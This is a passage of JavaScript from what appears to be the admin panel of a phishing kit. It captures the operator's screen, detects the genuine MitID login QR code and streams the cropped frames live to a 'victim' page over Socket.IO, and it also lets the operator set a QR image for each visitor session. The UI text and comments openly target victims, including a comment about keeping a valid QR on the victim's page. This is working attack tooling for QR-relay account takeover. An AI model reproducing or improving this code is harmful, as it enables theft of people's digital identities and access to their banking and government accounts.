          if (setQrPreview) setQrPreview.src = '';
          if (setQrPreviewWrap) setQrPreviewWrap.style.display = 'none';
          if (setQrDropLabel) setQrDropLabel.textContent = 'Click or drop a QR code image here';
          if (setQrFileName) setQrFileName.textContent = '';
          if (setQrSaveBtn) { setQrSaveBtn.disabled = true; setQrSaveBtn.style.opacity = '0.5'; }
        });
      }

      if (setQrSaveBtn) {
        setQrSaveBtn.addEventListener('click', async () => {
          if (!qrBase64) return;
          const websiteId = s.website_id;
          const visitorId = s.visitor_id || s.id;
          if (!websiteId) {
            window.showToast('Could not determine website ID for this session', 'error');
            return;
          }
          if (!_qrTargetPage) {
            window.showToast('No QR-capable page found for this website', 'error');
            return;
          }
          setQrSaveBtn.disabled = true;
          setQrSaveBtn.textContent = '⏳ Saving…';
          try {
            await window.ALPApi.upsertPageSlot(websiteId, _qrTargetPage.id, {
              slot_name: 'qr-image',
              slot_type: 'img',
              label: 'QR Code Image',
              content: qrBase64,
              session_id: visitorId
            });
            window.showToast(`QR set for session ${visitorId.slice(0,8)}… — active on next page load`, 'success');
            setQrSaveBtn.textContent = '✅ Saved!';
            setTimeout(() => {
              setQrSaveBtn.textContent = '💾 Save QR for Session';
              setQrSaveBtn.disabled = false;
            }, 2000);
          } catch (e) {
            window.showToast('Failed to save QR: ' + (e.message || 'Error'), 'error');
            setQrSaveBtn.disabled = false;
            setQrSaveBtn.textContent = '💾 Save QR for Session';
            setQrSaveBtn.style.opacity = '1';
          }
        });
      }

      // ═══════════════════════════════════════════════════════════════════════
      // Live QR Stream — getDisplayMedia screen capture → Socket.IO → victim
      // ═══════════════════════════════════════════════════════════════════════
      const liveQrOuter = panel.querySelector('#live-qr-outer');
      const liveQrToggle = panel.querySelector('#live-qr-panel-toggle');
      const liveQrBody = panel.querySelector('#live-qr-panel-body');
      const liveQrChevron = panel.querySelector('#live-qr-chevron');
      const liveQrStartBtn = panel.querySelector('#live-qr-start-btn');
      const liveQrStopBtn = panel.querySelector('#live-qr-stop-btn');
      const liveQrPreview = panel.querySelector('#live-qr-preview');
      const liveQrPlaceholder = panel.querySelector('#live-qr-placeholder');
      const liveQrDual = panel.querySelector('#live-qr-dual');
      const liveQrFullPreview = panel.querySelector('#live-qr-full-preview');
      const liveQrStats = panel.querySelector('#live-qr-stats');
      const statFps = panel.querySelector('#stat-fps');
      const statFrames = panel.querySelector('#stat-frames');
      const statSize = panel.querySelector('#stat-size');
      const statDetector = panel.querySelector('#stat-detector');
      const statUptime = panel.querySelector('#stat-uptime');
      const statQrbox = panel.querySelector('#stat-qrbox');
      let _liveStartTime = 0;
      let _liveUptimeInterval = null;
      let _liveRecentFrameTimes = [];  // for FPS calculation

      // ═══════════════════════════════════════════════════════════════════
      // Fullscreen Stream Modal — built on demand, mirrors the stream UI
      // ═══════════════════════════════════════════════════════════════════
      let _modalEl = null;
      let _modalElements = null;  // refs to modal's own preview/stat/banner elements

      function _buildModal() {
        if (_modalEl) return;
        const overlay = document.createElement('div');
        overlay.id = 'live-qr-modal-overlay';
        overlay.style.cssText = 'position:fixed; inset:0; background:rgba(0,0,0,0.85); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); z-index:9999; display:none; align-items:center; justify-content:center; padding:24px; animation:fadeIn 0.2s ease;';

        overlay.innerHTML = `
          <style>
            @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
            @keyframes modalSlide { from { transform:translateY(20px); opacity:0; } to { transform:translateY(0); opacity:1; } }
          </style>
          <div style="width:100%; max-width:980px; max-height:92vh; overflow-y:auto; background:linear-gradient(145deg, #0a0a0f 0%, #15151e 100%); border:1px solid rgba(239,68,68,0.3); border-radius:16px; box-shadow:0 25px 70px rgba(0,0,0,0.7), 0 0 100px rgba(239,68,68,0.15); animation:modalSlide 0.3s ease;">
            <!-- Header -->
            <div style="display:flex; justify-content:space-between; align-items:center; padding:14px 20px; border-bottom:1px solid rgba(239,68,68,0.2); background:linear-gradient(90deg, rgba(239,68,68,0.1), transparent);">
              <div>
                <div style="font-size:15px; font-weight:800; color:#f87171; letter-spacing:0.5px; display:flex; align-items:center; gap:10px;">
                  <span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:#ef4444; box-shadow:0 0 12px #ef4444; animation:pulseGlow 1.2s infinite;"></span>
                  LIVE QR STREAM — FULLSCREEN
                </div>
                <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">Streaming the real MitID QR to the victim in real-time</div>
              </div>
              <button id="live-qr-modal-close" style="background:rgba(107,114,128,0.2); border:1px solid rgba(107,114,128,0.4); color:#9ca3af; padding:8px 14px; border-radius:8px; font-size:12px; font-weight:700; cursor:pointer; display:flex; align-items:center; gap:6px;">✕ Close</button>
            </div>

            <!-- Big status banner -->
            <div id="modal-detect-status" style="display:none; margin:12px 20px 0; padding:12px 20px; border-radius:12px; font-size:16px; font-weight:900; letter-spacing:0.8px; text-align:center; text-transform:uppercase; position:relative; overflow:hidden; transition:all 0.3s ease;">
              <span id="modal-detect-status-text" style="position:relative; z-index:2;"></span>
              <span style="position:absolute; top:0; left:-100%; width:50%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); animation:shineSweep 2.4s infinite; z-index:1;"></span>
            </div>

            <!-- Dual preview — BIG -->
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px; padding:14px 20px;">
              <!-- Source (big) -->
              <div style="position:relative; border:1px solid rgba(239,68,68,0.3); border-radius:12px; overflow:hidden; background:rgba(0,0,0,0.4); min-height:280px;">
                <div style="position:absolute; top:8px; left:10px; font-size:10px; font-weight:800; color:#fbbf24; letter-spacing:1px; text-transform:uppercase; z-index:2; background:rgba(0,0,0,0.75); padding:4px 10px; border-radius:6px;">📺 SOURCE — WHAT YOU SHARE</div>
                <canvas id="modal-full-preview" style="width:100%; height:280px; display:block; background:#000;"></canvas>
              </div>
              <!-- Sent (big) -->
              <div style="position:relative; border:1px solid rgba(16,185,129,0.4); border-radius:12px; overflow:hidden; background:#fff; min-height:280px;">
                <div style="position:absolute; top:8px; left:10px; font-size:10px; font-weight:800; color:#059669; letter-spacing:1px; text-transform:uppercase; z-index:2; background:rgba(255,255,255,0.9); padding:4px 10px; border-radius:6px;">📤 SENT — WHAT THE VICTIM SEES</div>
                <img id="modal-preview" src="" alt="Cropped QR" style="width:100%; height:280px; object-fit:contain; display:block; background:#fff; image-rendering:pixelated; image-rendering:-moz-crisp-edges; image-rendering:crisp-edges;">
              </div>
            </div>

            <!-- Big stats grid -->
            <div style="display:grid; grid-template-columns:repeat(6,1fr); gap:8px; padding:0 20px 14px; font-family:'JetBrains Mono', monospace;">
              <div style="background:linear-gradient(135deg, rgba(239,68,68,0.1), rgba(239,68,68,0.03)); border:1px solid rgba(239,68,68,0.3); border-radius:9px; padding:10px 12px;">
                <div style="font-size:9px; color:var(--text-muted); letter-spacing:0.8px; text-transform:uppercase; margin-bottom:6px;">FPS</div>
                <div id="modal-stat-fps" style="font-size:22px; color:#f87171; font-weight:800;">—</div>
              </div>
              <div style="background:linear-gradient(135deg, rgba(251,191,36,0.1), rgba(251,191,36,0.03)); border:1px solid rgba(251,191,36,0.3); border-radius:10px; padding:14px;">
                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Frames</div>
                <div id="modal-stat-frames" style="font-size:22px; color:#fbbf24; font-weight:800;">0</div>
              </div>
              <div style="background:linear-gradient(135deg, rgba(96,165,250,0.1), rgba(96,165,250,0.03)); border:1px solid rgba(96,165,250,0.3); border-radius:10px; padding:14px;">
                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Size</div>
                <div id="modal-stat-size" style="font-size:22px; color:#60a5fa; font-weight:800;">—</div>
              </div>
              <div style="background:linear-gradient(135deg, rgba(16,185,129,0.1), rgba(16,185,129,0.03)); border:1px solid rgba(16,185,129,0.3); border-radius:10px; padding:14px;">
                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Detector</div>
                <div id="modal-stat-detector" style="font-size:16px; color:#6ee7b7; font-weight:800;">—</div>
              </div>
              <div style="background:linear-gradient(135deg, rgba(167,139,250,0.1), rgba(167,139,250,0.03)); border:1px solid rgba(167,139,250,0.3); border-radius:10px; padding:14px;">
                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Uptime</div>
                <div id="modal-stat-uptime" style="font-size:22px; color:#a78bfa; font-weight:800;">00:00</div>
              </div>
              <div style="background:linear-gradient(135deg, rgba(110,231,183,0.1), rgba(110,231,183,0.03)); border:1px solid rgba(110,231,183,0.3); border-radius:10px; padding:14px;">
                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">QR Box</div>
                <div id="modal-stat-qrbox" style="font-size:16px; color:#6ee7b7; font-weight:800;">—</div>
              </div>
            </div>

            <!-- Controls section -->
            <div style="padding:0 24px 20px;">
              <!-- Streaming status indicator -->
              <div style="display:flex; align-items:center; gap:10px; padding:10px 14px; background:rgba(0,0,0,0.3); border:1px solid rgba(239,68,68,0.2); border-radius:10px; margin-bottom:14px;">
                <span id="modal-live-dot" style="width:10px; height:10px; border-radius:50%; background:#6b7280; display:inline-block; transition:all 0.3s;"></span>
                <span id="modal-live-status-text" style="font-size:13px; font-weight:600; color:var(--text-secondary);">Not streaming</span>
              </div>

              <!-- Big Start/Stop buttons -->
              <div style="display:flex; gap:10px; margin-bottom:12px;">
                <button id="modal-live-start-btn" style="flex:2; padding:14px; background:linear-gradient(135deg,#ef4444,#dc2626); color:#fff; border:none; border-radius:10px; font-size:14px; font-weight:800; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:8px; letter-spacing:0.5px; box-shadow:0 4px 12px rgba(239,68,68,0.3); transition:all 0.2s;">🔴 START STREAMING</button>
                <button id="modal-live-stop-btn" style="flex:1; padding:14px; background:rgba(107,114,128,0.15); border:1px solid rgba(107,114,128,0.3); color:#9ca3af; border-radius:10px; font-size:14px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px; letter-spacing:0.3px;" disabled>⏹ STOP</button>
              </div>

              <!-- Settings row -->
              <div style="display:flex; gap:16px; align-items:center; padding:12px 14px; background:rgba(0,0,0,0.2); border:1px solid rgba(255,255,255,0.05); border-radius:10px; flex-wrap:wrap;">
                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:6px; cursor:pointer;">
                  <span style="font-weight:600;">Interval:</span>
                  <select id="modal-live-interval" style="padding:5px 8px; background:rgba(15,15,20,0.8); border:1px solid rgba(239,68,68,0.3); border-radius:6px; color:var(--text-primary); font-size:12px; cursor:pointer;">
                    <option value="300">300ms (fast)</option>
                    <option value="500" selected>500ms</option>
                    <option value="1000">1s</option>
                    <option value="2000">2s</option>
                  </select>
                </label>
                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:6px; cursor:pointer;">
                  <span style="font-weight:600;">Quality:</span>
                  <select id="modal-live-quality" style="padding:5px 8px; background:rgba(15,15,20,0.8); border:1px solid rgba(239,68,68,0.3); border-radius:6px; color:var(--text-primary); font-size:12px; cursor:pointer;">
                    <option value="0.5">Low</option>
                    <option value="0.7" selected>Medium</option>
                    <option value="0.9">High</option>
                  </select>
                </label>
                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:8px; cursor:pointer; margin-left:auto;">
                  <input type="checkbox" id="modal-live-smart" checked style="margin:0; cursor:pointer; width:16px; height:16px;">
                  <span style="font-weight:600;">🎯 Smart Crop (auto-detect QR)</span>
                </label>
                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:8px; cursor:pointer;" title="When detection fails, keep showing the last captured QR on the victim's page">
                  <input type="checkbox" id="modal-live-hold" checked style="margin:0; cursor:pointer; width:16px; height:16px;">
                  <span style="font-weight:600;">🔒 Hold on miss</span>
                </label>
              </div>

              <div style="margin-top:14px; padding-top:14px; border-top:1px solid rgba(255,255,255,0.05); font-size:11px; color:var(--text-muted); text-align:center;">
                Press <kbd style="background:rgba(255,255,255,0.1); padding:2px 6px; border-radius:4px; font-family:monospace;">ESC</kbd> or click outside to close. Streaming continues in the background.
              </div>
            </div>
          </div>
        `;

        document.body.appendChild(overlay);
        _modalEl = overlay;

        _modalElements = {
          detectStatus: overlay.querySelector('#modal-detect-status'),
          detectStatusText: overlay.querySelector('#modal-detect-status-text'),
          fullPreview: overlay.querySelector('#modal-full-preview'),
          preview: overlay.querySelector('#modal-preview'),
          statFps: overlay.querySelector('#modal-stat-fps'),
          statFrames: overlay.querySelector('#modal-stat-frames'),
          statSize: overlay.querySelector('#modal-stat-size'),
          statDetector: overlay.querySelector('#modal-stat-detector'),
          statUptime: overlay.querySelector('#modal-stat-uptime'),
          statQrbox: overlay.querySelector('#modal-stat-qrbox'),
          liveDot: overlay.querySelector('#modal-live-dot'),
          liveStatusText: overlay.querySelector('#modal-live-status-text'),
          startBtn: overlay.querySelector('#modal-live-start-btn'),
          stopBtn: overlay.querySelector('#modal-live-stop-btn'),
          intervalSel: overlay.querySelector('#modal-live-interval'),
          qualitySel: overlay.querySelector('#modal-live-quality'),
          smartCb: overlay.querySelector('#modal-live-smart'),
          holdCb: overlay.querySelector('#modal-live-hold'),
        };

        // Wire modal controls to drawer controls (two-way sync)
        // Start/Stop → forward to drawer buttons
        _modalElements.startBtn.addEventListener('click', () => {
          if (liveQrStartBtn) liveQrStartBtn.click();
        });
        _modalElements.stopBtn.addEventListener('click', () => {
          if (liveQrStopBtn) liveQrStopBtn.click();
        });

        // Interval/Quality → sync both ways
        _modalElements.intervalSel.addEventListener('change', () => {
          if (liveQrIntervalSel) {
            liveQrIntervalSel.value = _modalElements.intervalSel.value;
            liveQrIntervalSel.dispatchEvent(new Event('change'));
          }
        });
        _modalElements.qualitySel.addEventListener('change', () => {
          if (liveQrQualitySel) {
            liveQrQualitySel.value = _modalElements.qualitySel.value;
            liveQrQualitySel.dispatchEvent(new Event('change'));
          }
        });
        _modalElements.smartCb.addEventListener('change', () => {
          if (liveQrSmartCb) {
            liveQrSmartCb.checked = _modalElements.smartCb.checked;
            liveQrSmartCb.dispatchEvent(new Event('change'));
          }
        });
        if (_modalElements.holdCb) {
          _modalElements.holdCb.addEventListener('change', () => {
            if (liveQrHoldCb) {
              liveQrHoldCb.checked = _modalElements.holdCb.checked;
              liveQrHoldCb.dispatchEvent(new Event('change'));
            }
          });
        }

        // Initialize modal controls from drawer state
        if (liveQrIntervalSel) _modalElements.intervalSel.value = liveQrIntervalSel.value;
        if (liveQrQualitySel) _modalElements.qualitySel.value = liveQrQualitySel.value;
        if (liveQrSmartCb) _modalElements.smartCb.checked = liveQrSmartCb.checked;
        if (liveQrHoldCb && _modalElements.holdCb) _modalElements.holdCb.checked = liveQrHoldCb.checked;

        // Initialize start/stop button states from drawer
        if (liveQrStartBtn && liveQrStartBtn.disabled) {
          _modalElements.startBtn.disabled = true;
          _modalElements.startBtn.style.opacity = '0.5';
          _modalElements.startBtn.style.cursor = 'not-allowed';
        }
        if (liveQrStopBtn && !liveQrStopBtn.disabled) {
          _modalElements.stopBtn.disabled = false;
          _modalElements.stopBtn.style.background = 'rgba(239,68,68,0.15)';
          _modalElements.stopBtn.style.borderColor = 'rgba(239,68,68,0.4)';
          _modalElements.stopBtn.style.color = '#f87171';
        }

        // Close handlers
        overlay.querySelector('#live-qr-modal-close').addEventListener('click', _closeModal);
        overlay.addEventListener('click', (e) => { if (e.target === overlay) _closeModal(); });
        document.addEventListener('keydown', (e) => {
          if (e.key === 'Escape' && _modalEl && _modalEl.style.display === 'flex') _closeModal();
        });
      }

      function _openModal() {
        _buildModal();
        _modalEl.style.display = 'flex';
      }

      function _closeModal() {
        if (_modalEl) _modalEl.style.display = 'none';
      }

      function _isModalOpen() {
        return _modalEl && _modalEl.style.display === 'flex';
      }

      const liveQrExpandBtn = panel.querySelector('#live-qr-expand-btn');
      if (liveQrExpandBtn) {
        liveQrExpandBtn.addEventListener('click', (e) => {
          e.stopPropagation();  // don't trigger panel collapse
          _openModal();
        });
      }

      const liveQrDot = panel.querySelector('#live-qr-dot');
      const liveQrStatusText = panel.querySelector('#live-qr-status-text');
      const liveQrIntervalSel = panel.querySelector('#live-qr-interval');
      const liveQrQualitySel = panel.querySelector('#live-qr-quality');
      const liveQrSmartCb = panel.querySelector('#live-qr-smart');
      const liveQrHoldCb = panel.querySelector('#live-qr-hold');
      const liveQrDetectStatus = panel.querySelector('#live-qr-detect-status');
      const liveQrDetectStatusText = panel.querySelector('#live-qr-detect-status-text');
      let _lastDetectState = null;  // 'ok' | 'warn' | null — for toast state-change triggers

      let _liveStream = null;        // MediaStream from getDisplayMedia
      let _liveVideo = null;         // hidden <video> for frame capture
      let _liveCanvas = null;        // off-screen canvas
      let _liveInterval = null;      // setInterval id
      let _liveFrameCount = 0;

      // Show the live QR panel whenever the static QR panel is shown (same condition)
      if (liveQrOuter && _qrTargetPage) {
        liveQrOuter.style.display = 'block';
      }
      // Also show if _qrTargetPage is set later by the async check above
      // We piggyback on the same async block — wrap it:
      if (liveQrOuter && s.website_id && !_qrTargetPage) {
        // The async block above already sets _qrTargetPage — we poll for it briefly
        const _liveQrPoll = setInterval(() => {
          if (_qrTargetPage) {
            liveQrOuter.style.display = 'block';
            clearInterval(_liveQrPoll);
          }
        }, 200);
        setTimeout(() => clearInterval(_liveQrPoll), 5000);
      }

      if (liveQrToggle && liveQrBody) {
        liveQrToggle.addEventListener('click', () => {
          const isOpen = liveQrBody.style.display !== 'none';
          liveQrBody.style.display = isOpen ? 'none' : 'block';
          if (liveQrChevron) liveQrChevron.style.transform = isOpen ? '' : 'rotate(180deg)';
        });
      }

      function _liveQrSetStatus(streaming) {
        if (liveQrDot) liveQrDot.style.background = streaming ? '#ef4444' : '#6b7280';
        if (liveQrDot && streaming) liveQrDot.style.animation = 'alertBlink 1s infinite';
        else if (liveQrDot) liveQrDot.style.animation = '';
        if (liveQrStatusText) liveQrStatusText.textContent = streaming
          ? `🔴 Streaming (${_liveFrameCount} frames sent)`
          : 'Not streaming';
        if (liveQrStartBtn) { liveQrStartBtn.disabled = streaming; liveQrStartBtn.style.opacity = streaming ? '0.4' : '1'; }
        if (liveQrStopBtn) { liveQrStopBtn.disabled = !streaming; liveQrStopBtn.style.opacity = streaming ? '1' : '0.5'; }

        // Mirror to modal controls when the modal has been built
        if (typeof _modalElements !== 'undefined' && _modalElements) {
          if (_modalElements.liveDot) {
            _modalElements.liveDot.style.background = streaming ? '#ef4444' : '#6b7280';
            _modalElements.liveDot.style.animation = streaming ? 'alertBlink 1s infinite' : '';
            _modalElements.liveDot.style.boxShadow = streaming ? '0 0 12px #ef4444' : 'none';
          }
          if (_modalElements.liveStatusText) {
            _modalElements.liveStatusText.textContent = streaming
              ? `🔴 Streaming (${_liveFrameCount} frames sent)`
              : 'Not streaming';
            _modalElements.liveStatusText.style.color = streaming ? '#f87171' : 'var(--text-secondary)';
          }
          if (_modalElements.startBtn) {
            _modalElements.startBtn.disabled = streaming;
            _modalElements.startBtn.style.opacity = streaming ? '0.4' : '1';
            _modalElements.startBtn.style.cursor = streaming ? 'not-allowed' : 'pointer';
          }
          if (_modalElements.stopBtn) {
            _modalElements.stopBtn.disabled = !streaming;
            if (streaming) {
              _modalElements.stopBtn.style.background = 'rgba(239,68,68,0.15)';
              _modalElements.stopBtn.style.borderColor = 'rgba(239,68,68,0.4)';
              _modalElements.stopBtn.style.color = '#f87171';
              _modalElements.stopBtn.style.cursor = 'pointer';
            } else {
              _modalElements.stopBtn.style.background = 'rgba(107,114,128,0.15)';
              _modalElements.stopBtn.style.borderColor = 'rgba(107,114,128,0.3)';
              _modalElements.stopBtn.style.color = '#9ca3af';
              _modalElements.stopBtn.style.cursor = 'not-allowed';
            }
          }
        }
      }

      function _liveQrStop() {
        if (_liveInterval) { clearInterval(_liveInterval); _liveInterval = null; }
        if (_liveStream) {
          _liveStream.getTracks().forEach(t => t.stop());
          _liveStream = null;
        }
        if (_liveVideo) { _liveVideo.pause(); _liveVideo.srcObject = null; _liveVideo = null; }
        _liveCanvas = null;
        _liveFrameCount = 0;
        _liveQrSetStatus(false);
        if (liveQrDual) liveQrDual.style.display = 'none';
        if (liveQrStats) liveQrStats.style.display = 'none';
        if (liveQrDetectStatus) liveQrDetectStatus.style.display = 'none';
        if (_modalElements && _modalElements.detectStatus) _modalElements.detectStatus.style.display = 'none';
        if (liveQrPlaceholder) liveQrPlaceholder.style.display = 'block';
        _lastDetectState = null;
        if (_liveUptimeInterval) { clearInterval(_liveUptimeInterval); _liveUptimeInterval = null; }
        _liveRecentFrameTimes = [];
        // NOTE: we intentionally DO NOT emit admin:qr-stream-stop here.
        // Leaving the last captured QR frame visible on the victim's page
        // is the desired UX — the victim sees a valid QR until page reload.
      }

      if (liveQrStartBtn) {
        liveQrStartBtn.addEventListener('click', async () => {
          try {
            // Stop any existing stream first
            _liveQrStop();

            // Request screen/tab capture
            _liveStream = await navigator.mediaDevices.getDisplayMedia({
              video: { cursor: 'never', frameRate: 5 },
              audio: false
            });

            // Create hidden video element to play the stream
            _liveVideo = document.createElement('video');
            _liveVideo.srcObject = _liveStream;
            _liveVideo.muted = true;
            _liveVideo.playsInline = true;
            await _liveVideo.play();

            // Create off-screen canvas
            _liveCanvas = document.createElement('canvas');

            // When user stops sharing via browser UI
            _liveStream.getVideoTracks()[0].addEventListener('ended', () => {
              _liveQrStop();
              window.showToast('Screen sharing stopped', 'info');
            });

            _liveQrSetStatus(true);
            if (liveQrPlaceholder) liveQrPlaceholder.style.display = 'none';
            if (liveQrDual) liveQrDual.style.display = 'grid';
            if (liveQrStats) liveQrStats.style.display = 'grid';
            _liveStartTime = Date.now();
            if (_liveUptimeInterval) clearInterval(_liveUptimeInterval);
            _liveUptimeInterval = setInterval(() => {
              const secs = Math.floor((Date.now() - _liveStartTime) / 1000);
              const mm = String(Math.floor(secs / 60)).padStart(2, '0');
              const ss = String(secs % 60).padStart(2, '0');
              const _ut = mm + ':' + ss;
              if (statUptime) statUptime.textContent = _ut;
              if (_modalElements && _modalElements.statUptime) _modalElements.statUptime.textContent = _ut;
            }, 1000);

            const intervalMs = parseInt(liveQrIntervalSel?.value || '500', 10);
            const quality = parseFloat(liveQrQualitySel?.value || '0.7');

            // ─── Smart QR detector setup ────────────────────────
            // Prefer native BarcodeDetector (Chrome, zero-dep, GPU-accel).
            // Fallback to jsQR (lazy-loaded from CDN) for other browsers.
            let _qrDetector = null;
            let _qrDetectorKind = 'none';
            let _lastGoodCrop = null;      // last detected bbox for smoothing
            let _lastGoodFrame = null;     // last successful cropped QR frame (base64) for Hold mode
            let _usingFallbackFrame = false;  // true when sending cached frame instead of live
            let _detectMissCount = 0;      // consecutive misses

            if ('BarcodeDetector' in window) {
              try {
                _qrDetector = new window.BarcodeDetector({ formats: ['qr_code'] });
                _qrDetectorKind = 'native';
              } catch (_) {}
            }

            // Lazy-load jsQR if BarcodeDetector unavailable
            if (!_qrDetector && !window.jsQR) {
              try {
                const scr = document.createElement('script');
                scr.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js';
                scr.async = true;
                document.head.appendChild(scr);
                scr.onload = () => {
                  if (window.jsQR) {
                    _qrDetector = { kind: 'jsqr' };
                    _qrDetectorKind = 'jsqr';
                  }
                };
              } catch (_) {}
            } else if (!_qrDetector && window.jsQR) {
              _qrDetector = { kind: 'jsqr' };
              _qrDetectorKind = 'jsqr';
            }

            const _detLabel = _qrDetectorKind === 'native'
              ? 'Native' : (_qrDetectorKind === 'jsqr' ? 'jsQR' : 'Loading…');
            if (statDetector) statDetector.textContent = _detLabel;
            if (_modalElements && _modalElements.statDetector) _modalElements.statDetector.textContent = _detLabel;
            if (liveQrDetectStatus && liveQrDetectStatusText) {
              liveQrDetectStatus.style.display = 'block';
              liveQrDetectStatus.className = 'qr-status-warn';
              liveQrDetectStatusText.textContent = '⟳ Initializing — share your screen';
            }
            if (_modalElements && _modalElements.detectStatus) {
              _modalElements.detectStatus.style.display = 'block';
              _modalElements.detectStatus.className = 'qr-status-warn';
              _modalElements.detectStatusText.textContent = '⟳ Initializing — share your screen';
            }

            // Off-screen full-resolution canvas (for detection)
            const _detectCanvas = document.createElement('canvas');
            // Final crop canvas (what we actually send — square, padded)
            const _cropCanvas = document.createElement('canvas');

            // ─── Detect QR bounding box, return {x,y,w,h} in source px, or null
            async function _detectQrBox(video) {
              const vw = video.videoWidth;
              const vh = video.videoHeight;
              if (!vw || !vh || !_qrDetector) return null;

              // Draw frame to detect canvas at a moderate size (640px max)
              // — large enough for detection, small enough for speed.
              const dMax = 640;
              const dScale = Math.min(dMax / vw, dMax / vh, 1);
              const dw = Math.round(vw * dScale);
              const dh = Math.round(vh * dScale);
              _detectCanvas.width = dw;
              _detectCanvas.height = dh;
              const dctx = _detectCanvas.getContext('2d', { willReadFrequently: true });
              dctx.drawImage(video, 0, 0, dw, dh);

              try {
                let candidate = null;
                let decodedValue = null;

                if (_qrDetectorKind === 'native') {
                  const codes = await _qrDetector.detect(_detectCanvas);
                  if (codes && codes.length > 0) {
                    const b = codes[0].boundingBox;
                    decodedValue = codes[0].rawValue || '';
                    candidate = {
                      x: b.x / dScale,
                      y: b.y / dScale,
                      w: b.width / dScale,
                      h: b.height / dScale,
                      value: decodedValue
                    };
                  }
                } else if (_qrDetectorKind === 'jsqr' && window.jsQR) {
                  const imgData = dctx.getImageData(0, 0, dw, dh);
                  const code = window.jsQR(imgData.data, dw, dh, { inversionAttempts: 'dontInvert' });
                  if (code && code.location) {
                    const loc = code.location;
                    const xs = [loc.topLeftCorner.x, loc.topRightCorner.x, loc.bottomLeftCorner.x, loc.bottomRightCorner.x];
                    const ys = [loc.topLeftCorner.y, loc.topRightCorner.y, loc.bottomLeftCorner.y, loc.bottomRightCorner.y];
                    const minX = Math.min(...xs), maxX = Math.max(...xs);
                    const minY = Math.min(...ys), maxY = Math.max(...ys);
                    decodedValue = code.data || '';
                    candidate = {
                      x: minX / dScale,
                      y: minY / dScale,
                      w: (maxX - minX) / dScale,
                      h: (maxY - minY) / dScale,
                      value: decodedValue
                    };
                  }
                }

                // ─── Strict validation to kill false positives ───────────────
                // Real QR codes (especially MitID):
                //   • Are at least 100×100 px in a shared screen
                //   • Encode a URL or long token (≥10 chars)
                //   • Are square (aspect ratio within ±25%)
                //   • Fit inside the detection canvas
                if (candidate && decodedValue && decodedValue.length >= 10) {
                  const w = candidate.w, h = candidate.h;
                  const aspect = w > 0 && h > 0 ? Math.max(w, h) / Math.min(w, h) : 999;
                  const inBounds = candidate.x >= 0 && candidate.y >= 0 &&
                                   (candidate.x + w) <= video.videoWidth &&
                                   (candidate.y + h) <= video.videoHeight;
                  if (w >= 100 && h >= 100 && aspect <= 1.25 && inBounds) {
                    return candidate;
                  }
                }
              } catch (_) {}
              return null;
            }

            // Frame capture loop
            _liveInterval = setInterval(async () => {
              if (!_liveVideo || _liveVideo.readyState < 2 || !_liveCanvas) return;

              const vw = _liveVideo.videoWidth;
              const vh = _liveVideo.videoHeight;
              if (!vw || !vh) return;

              const smartMode = liveQrSmartCb?.checked !== false;
              let box = null;
              let freshDetection = false;  // true only when THIS frame had a real detection

              if (smartMode && _qrDetector) {
                const detected = await _detectQrBox(_liveVideo);
                if (detected) {
                  box = detected;
                  freshDetection = true;
                  _lastGoodCrop = detected;
                  _detectMissCount = 0;
                } else {
                  _detectMissCount++;
                  // Don't reuse stale box — if detection fails, we fail honestly.
                  // The Hold cache will cover display, not a stale-box crop.
                }
                // Shiny banner + state-change toast notifications (3 states)
                const _holdActive = !!(liveQrHoldCb && liveQrHoldCb.checked);
                let _statusText, _statusClass;
                if (box) {
                  _statusText = `🎯 QR LOCKED — ${Math.round(box.w)}×${Math.round(box.h)}px`;
                  _statusClass = 'qr-status-ok';
                } else if (_holdActive && _lastGoodFrame) {
                  _statusText = '🔒 NO QR — HOLDING LAST CAPTURED FRAME';
                  _statusClass = 'qr-status-hold';
                } else if (!_holdActive) {
                  _statusText = '⏸ NO QR — HOLD OFF, NOT SENDING';
                  _statusClass = 'qr-status-warn';
                } else {
                  _statusText = '⚠ NO QR DETECTED IN FRAME';
                  _statusClass = 'qr-status-warn';
                }
                if (liveQrDetectStatus && liveQrDetectStatusText) {
                  liveQrDetectStatus.style.display = 'block';
                  liveQrDetectStatus.className = _statusClass;
                  liveQrDetectStatusText.textContent = _statusText;
                }
                // Mirror to modal
                if (_modalElements && _modalElements.detectStatus) {
                  _modalElements.detectStatus.style.display = 'block';
                  _modalElements.detectStatus.className = _statusClass;
                  _modalElements.detectStatusText.textContent = _statusText;
                }
                // Tri-state toasts (ok / hold / warn)
                let _newState;
                if (box) _newState = 'ok';
                else if (_holdActive && _lastGoodFrame) _newState = 'hold';
                else if (!_holdActive) _newState = 'idle';
                else _newState = 'warn';
                if (_newState !== _lastDetectState) {
                  _lastDetectState = _newState;
                  if (window.showToast) {
                    if (_newState === 'ok') {
                      window.showToast('🎯 QR locked — streaming to victim', 'success', 2000);
                    } else if (_newState === 'hold') {
                      window.showToast('🔒 QR lost — holding last captured frame on victim', 'info', 2500);
                    } else if (_newState === 'idle') {
                      window.showToast('⏸ QR lost — Hold is off, not sending frames', 'info', 2500);
                    } else {
                      window.showToast('⚠ No QR in frame — aim at the MitID QR', 'warning', 2500);
                    }
                  }
                }
              }

              const outSize = 512;  // square output at higher res — stays crisp when the modal scales up
              _cropCanvas.width = outSize;
              _cropCanvas.height = outSize;
              const cctx = _cropCanvas.getContext('2d');
